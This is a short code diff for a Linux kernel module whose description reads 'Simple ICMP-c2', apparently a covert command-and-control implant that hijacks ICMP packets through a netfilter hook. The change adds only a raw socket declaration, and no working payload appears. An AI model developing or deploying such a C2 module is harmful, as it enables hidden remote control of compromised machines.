@@ -22,6 +22,7 @@ MODULE_DESCRIPTION("Simple ICMP-c2");
 #define ICMP_REPLY  0
 #define ICMP_HLEN   8
 
+static struct socket *raw_socket;
 static struct nf_hook_ops nfho;
 unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
 static uint16_t checksum(uint16_t *data, int len);
